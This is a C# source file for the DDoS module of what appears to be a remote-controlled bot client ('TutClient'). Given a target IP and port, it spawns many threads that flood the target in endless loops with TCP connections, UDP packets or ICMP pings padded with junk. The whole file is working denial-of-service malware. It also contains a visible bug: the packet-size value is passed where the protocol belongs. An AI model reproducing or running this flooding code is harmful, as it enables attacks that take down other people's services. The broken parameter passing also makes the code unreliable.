using System;
using System.Collections.Generic;
using System.Net.Sockets;
using System.Text;
using System.Threading;

using TutClient.Params;

namespace TutClient.Controls
{
    public interface IDDoS
    {
        void StartDDoS(DDoSParams ddosParams);
        void StartDDoS();
        void StopDDoS();
    }

    /// <summary>
    /// The DDoS Module
    /// </summary>
    public class DDoS : IDDoS
    {
        /// <summary>
        /// The IP address to attack
        /// </summary>
        private string _ip = "";
        /// <summary>
        /// The port to attack on
        /// </summary>
        private int _port = 0;
        /// <summary>
        /// The protocol to use
        /// </summary>
        private int _prot = 0;
        /// <summary>
        /// The packet size to send
        /// </summary>
        private int _packetSize = 0;
        /// <summary>
        /// The number of <see cref="Thread"/>s to attack with
        /// </summary>
        private int _threads = 0;
        /// <summary>
        /// The delay to wait between packet sends
        /// </summary>
        private int _delay = 0;
        
        /// <summary>
        /// TCP Protocol ID
        /// </summary>
        private const int PROTOCOL_TCP = 0;
        /// <summary>
        /// UDP Protocol ID
        /// </summary>
        private const int PROTOCOL_UDP = 1;
        /// <summary>
        /// ICMP Protocol ID
        /// </summary>
        private const int PROTOCOL_ICMP = 2;
        /// <summary>
        /// DDoSing Thread
        /// </summary>
        private Thread _tDdos;
        /// <summary>
        /// DDoS Kill Switch
        /// </summary>
        private bool _kill = false;
        /// <summary>
        /// Is the DDoS completed
        /// </summary>
        private bool _isSetupCompleted = false;

        /// <summary>
        /// Start the attack
        /// </summary>
        public void StartDDoS()
        {
            if(_isSetupCompleted)
            {
                //Create the thread and start attacking
                _tDdos = new Thread(DDoSTarget);
                _tDdos.Start();
            }
        }

        /// <summary>
        /// Start the attack
        /// </summary>
        public void StartDDoS(DDoSParams ddosParams)
        {
            if(_isSetupCompleted == false)
            {
                SetupDDoS(ddosParams.Ip, ddosParams.Port, ddosParams.CPacketSize, ddosParams.CPacketSize, ddosParams.CThreads, ddosParams.CDelay);
            }

            //Create the thread and start attacking
            _tDdos = new Thread(DDoSTarget);
            _tDdos.Start();
        }

        /// <summary>
        /// Stop DDoSing target
        /// </summary>
        public void StopDDoS()
        {
            _kill = true; //Set the kill switch
        }

        /// <summary>
        /// Create a new DDoS Attack
        /// </summary>
        private void SetupDDoS(string cIp, string cPort, string cProtocol, string cPacketSize, string cThreads, string cDelay)
        {
            //Set all DDoS variables
            _ip = cIp;
            _port = int.Parse(cPort);
            switch (cProtocol)
            {
                case "TCP":
                    _prot = PROTOCOL_TCP;
                    break;

                case "UDP":
                    _prot = PROTOCOL_UDP;
                    break;

                case "ICMP ECHO (Ping)":
                    _prot = PROTOCOL_ICMP;
                    break;
            }

            _packetSize = int.Parse(cPacketSize);
            _threads = int.Parse(cThreads);
            _delay = int.Parse(cDelay);

            _isSetupCompleted = true;
        }

        /// <summary>
        /// Main Attacking Thread
        /// </summary>
        private void DDoSTarget()
        {
            var subThreads = new List<Thread>(); //List of sub threads

            //Determine the protocol, create threads and start attacking
            if (_prot == PROTOCOL_TCP)
            {
                for (var i = 0; i < _threads; i++)
                {
                    var t = new Thread(new ThreadStart(DDoSTcp));
                    t.Start();
                    subThreads.Add(t);
                }
            }

            if (_prot == PROTOCOL_UDP)
            {
                for (var i = 0; i < _threads; i++)
                {
                    var t = new Thread(new ThreadStart(DDoSUdp));
                    t.Start();
                    subThreads.Add(t);
                }
            }

            if (_prot == PROTOCOL_ICMP)
            {
                for (var i = 0; i < _threads; i++)
                {
                    var t = new Thread(new ThreadStart(DDoSIcmp));
                    t.Start();
                    subThreads.Add(t);
                }
            }

            while (!_kill) ; // Pause execution on this thread (ddos is still running at this point)
            foreach (var t in subThreads)
            {
                t.Abort();
            }

            _tDdos.Abort();
        }

        /// <summary>
        /// DDoS Using Icmp
        /// </summary>
        private void DDoSIcmp()
        {
            while (true)
            {
                if (_kill) break;
                try
                {
                    var ping = new System.Net.NetworkInformation.Ping(); //Create a new ping request
                    var junk = Encoding.Unicode.GetBytes(GenerateData()); //Get the data to send

                    ping.Send(_ip, 1000, junk); //Send the ping to the target
                    Thread.Sleep(_delay); //Wait if delay is set
                }
                catch (Exception ex)
                {
                    Console.WriteLine("ddos icmp error: " + ex.Message);
                }
            }
        }

        /// <summary>
        /// DDoS Using Udp
        /// </summary>
        private void DDoSUdp()
        {
            while (true)
            {
                if (_kill) break;

                
                try
                {
                    var client = new UdpClient(); //Create a UDP Client
                    var junk = Encoding.Unicode.GetBytes(GenerateData()); //Get the data to send
                    
                    client.Connect(_ip, _port); //Connect to the server
                    client.Send(junk, junk.Length); //Send the data to the server
                    client.Close(); //Close the connection
                    Thread.Sleep(_delay); //Wait if delay is set
                }
                catch (Exception ex)
                {
                    Console.WriteLine("ddos udp error: " + ex.Message);
                }
            }
        }

        /// <summary>
        /// DDoS Using Tcp
        /// </summary>
        private void DDoSTcp()
        {
            while (true)
            {
                if (_kill) break;

                try
                {
                    var client = new TcpClient(); //Create a new client
                    client.Connect(_ip, _port); //Connect to the server

                    var ns = client.GetStream(); //Get the stream of the server
                    var junk = Encoding.Unicode.GetBytes(GenerateData()); //Get the data to send
                    ns.Write(junk, 0, junk.Length); //Send data to server
                                                    //Shutdown the connection
                    ns.Close();
                    ns.Dispose();
                    client.Close();
                    Thread.Sleep(_delay); //Wait if delay is set
                }
                catch (Exception ex)
                {
                    Console.WriteLine("ddos tcp error: " + ex.Message);
                }
            }
        }

        /// <summary>
        /// Cache generate data call result
        /// </summary>
        private string _gdCache = string.Empty;

        /// <summary>
        /// Generate random random with the size given in packetSize
        /// </summary>
        /// <returns>Random string data</returns>
        private string GenerateData()
        {
            // Check the cache first
            if (_gdCache != string.Empty) return _gdCache;
            // Builder to append data to
            var data = new StringBuilder();

            for (var i = 0; i < _packetSize; i++)
            {
                data.Append("A"); // Add data to the string builder
            }

            // Set the cache
            _gdCache = data.ToString();

            return _gdCache; //Return the data
        }
    }
}
